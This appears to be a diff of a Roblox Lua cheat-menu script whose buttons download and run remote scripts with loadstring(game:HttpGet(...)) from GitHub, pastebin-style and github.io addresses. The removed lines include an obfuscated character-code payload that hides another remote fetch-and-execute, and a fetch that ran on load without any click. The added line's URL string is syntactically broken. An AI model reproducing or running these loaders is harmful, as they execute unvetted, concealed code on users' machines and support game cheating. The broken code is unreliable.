@@ -8,7 +8,6 @@ local Frame = Instance.new("Frame")
 local ScrollingFrame = Instance.new("ScrollingFrame")
 local dahood = Instance.new("TextButton")
 local MT = Instance.new("TextButton")
-local keyboard = Instance.new("TextButton")
 
 --Properties:
 
@@ -19,8 +18,6 @@ Frame.Parent = ScreenGui
 Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Frame.Position = UDim2.new(0.235109717, 0, 0.2532323, 0)
 Frame.Size = UDim2.new(0, 337, 0, 176)
-Frame.Active = true
-Frame.Draggable = true
 
 ScrollingFrame.Parent = Frame
 ScrollingFrame.Active = true
@@ -48,44 +45,22 @@ MT.Text = "Military tycoon"
 MT.TextColor3 = Color3.fromRGB(0, 0, 0)
 MT.TextSize = 14.000
 
-keyboard.Name = "keyboard"
-keyboard.Parent = ScrollingFrame
-keyboard.BackgroundColor3 = Color3.fromRGB(32, 60, 111)
-keyboard.Position = UDim2.new(-0.00284213573, 0, 0.357954532, 0)
-keyboard.Size = UDim2.new(0, 100, 0, 50)
-keyboard.Font = Enum.Font.Bangers
-keyboard.Text = "Keyboard"
-keyboard.TextColor3 = Color3.fromRGB(0, 0, 0)
-keyboard.TextSize = 14.000
-
 -- Scripts:
 
-local function JGYWWC_fake_script() -- dahood.LocalScript 
+local function KXUZQD_fake_script() -- dahood.LocalScript 
 	local script = Instance.new('LocalScript', dahood)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
 	end)
 end
-coroutine.wrap(JGYWWC_fake_script)()
-local function DCCHND_fake_script() -- MT.LocalScript 
+coroutine.wrap(KXUZQD_fake_script)()
+local function XZWUDFL_fake_script() -- MT.LocalScript 
 	local script = Instance.new('LocalScript', MT)
-	loadstring(game:HttpGet('https://pastebinp.com/raw/eccv9pgu'))()
-	script.Parent.MouseButton1Click:Connect(function()
-		
-	end)
-end
-coroutine.wrap(DCCHND_fake_script)()
-local function UQYBX_fake_script() -- keyboard.LocalScript 
-	local script = Instance.new('LocalScript', keyboard)
 
 	script.Parent.MouseButton1Click:Connect(function()
-		--[[
-	    Filename: Obfuscated_LocalScript.lua
-	    Obfuscated by SIGHTS Obfuscator (cracked by oof4dayz.xyz)
-	--]]
-	
-		SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBFRRRrRrrRR="";for ,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
+		loadstring(game:HttpGet"https://thedragonslayer2.github.io/AutoExec.html%22)()
 	end)
 end
-coroutine.wrap(UQYBX_fake_script)()
+coroutine.wrap(XZWUDFL_fake_script)()
+
